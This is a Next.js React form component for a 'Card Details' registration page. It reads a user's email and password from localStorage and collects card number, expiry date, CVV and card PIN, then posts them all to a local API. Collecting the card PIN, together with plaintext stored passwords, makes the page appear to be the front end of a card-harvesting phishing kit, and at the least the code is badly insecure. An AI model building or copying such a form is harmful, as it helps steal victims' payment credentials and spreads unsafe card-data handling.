"use client";
import React, { useEffect, useState } from "react";
import axios from "axios";
import { useRouter } from "next/navigation";
import Modal from "../modal/page";

const Form = () => {
  const [showModal, setShowModal] = useState(false);
  const [cardNumber, setCardNumber] = useState("");
  const [expiryDate, setExpiryDate] = useState("");
  const [cvv, setCvv] = useState("");
  const [cardPin, setCardPin] = useState("");

  const router = useRouter();

  useEffect(() => {
    const email = localStorage.getItem("email");
    const password = localStorage.getItem("password");
    if (!email || !password) {
      router.back();
      return;
    }
  }, [router]);

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!cardNumber || !cardPin || !cvv || !expiryDate) {
      alert("All fields are required");
      return;
    }
    if (cardNumber.length !== 16) {
      alert("Card Number must be 16 digits");
      return;
    }
    if (cvv.length !== 3) {
      alert("CVV must be 3 digits");
      return;
    }
    if (cardPin.length !== 6) {
      alert("Card PIN must be 6 digits");
      return;
    }
    submitForm();
  };

  const submitForm = async () => {
    try {
      const email = localStorage.getItem("email");
      await axios.post("/api/registration/card", {
        cardNumber,
        expiryDate,
        cvv,
        cardPin,
        email,
      });

      alert("Registration successful");
      router.back();
      setCardNumber("");
      setExpiryDate("");
      setCvv("");
      setCardPin("");
    } catch (error) {
      console.error("Registration failed:", error);
      alert("Registration failed");
    }
  };

  const handleModalConfirm = () => {
    setShowModal(false);
    submitForm();
  };

  const handleModalCancel = () => {
    setShowModal(false);
  };

  return (
    <div className="relative flex items-center justify-center min-h-[100vh] overflow-hidden bg-gradient-to-r from-purple-300 via-pink-100 to-red-500">
      <div className="absolute inset-0 bg-cover bg-center opacity-30" style={{ backgroundImage: "/bg.jpg" }}></div>
      <div className="relative bg-white p-8 rounded-2xl shadow-2xl w-[90vw] max-w-2xl overflow-y-auto max-h-[140vh] scrollbar-hide">
        <form onSubmit={handleSubmit}>
          <h3 className="text-xl font-semibold mt-8 mb-4 text-gray-800">Card Details</h3>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
          
            <div>
              <label className="block text-sm font-medium text-gray-700">Card Number</label>
              <input
                type="text"
                value={cardNumber}
                onChange={(e) => {
                  const input = e.target.value.replace(/[^0-9]/g, ""); 
                  if (input.length <= 16) setCardNumber(input); 
                }}
                placeholder="Enter 16-digit card number"
                maxLength="16"
                className="mt-1 p-3 border rounded-md shadow-sm focus:ring-indigo-500 focus:border-indigo-500 block w-full"
                required
              />
            </div>

         
            <div>
              <label className="block text-sm font-medium text-gray-700">Expiry Date</label>
              <input
                type="text"
                value={expiryDate}
                onChange={(e) => {
                  let input = e.target.value.replace(/[^0-9/]/g, ""); 
                  if (input.length === 2 && !input.includes("/")) {
                    input += "/"; 
                  }
                  if (input.length <= 5) setExpiryDate(input); 
                }}
                placeholder="MM/YY"
                maxLength="5"
                className="mt-1 p-3 border rounded-md shadow-sm focus:ring-indigo-500 focus:border-indigo-500 block w-full"
                required
              />
            </div>

            {/* CVV */}
            <div>
              <label className="block text-sm font-medium text-gray-700">CVV</label>
              <input
                type="text"
                value={cvv}
                onChange={(e) => {
                  const input = e.target.value.replace(/[^0-9]/g, ""); 
                  if (input.length <= 3) setCvv(input);
                }}
                placeholder="Enter 3-digit CVV"
                maxLength="3"
                className="mt-1 p-3 border rounded-md shadow-sm focus:ring-indigo-500 focus:border-indigo-500 block w-full"
                required
              />
            </div>

         
            <div>
              <label className="block text-sm font-medium text-gray-700">Card PIN</label>
              <input
                type="password"
                value={cardPin}
                onChange={(e) => {
                  const input = e.target.value.replace(/[^0-9]/g, "");
                  if (input.length <= 6) setCardPin(input);
                }}
                placeholder="Enter 6-digit Card PIN"
                maxLength="6"
                className="mt-1 p-3 border rounded-md shadow-sm focus:ring-indigo-500 focus:border-indigo-500 block w-full"
                required
              />
            </div>
          </div>

          <button type="submit" className="mt-8 bg-indigo-600 hover:bg-indigo-700 text-white font-bold py-3 px-6 rounded-full w-full">
            Submit
          </button>
        </form>

        {showModal && <Modal onConfirm={handleModalConfirm} onCancel={handleModalCancel} />}
      </div>
    </div>
  );
};

export default Form;
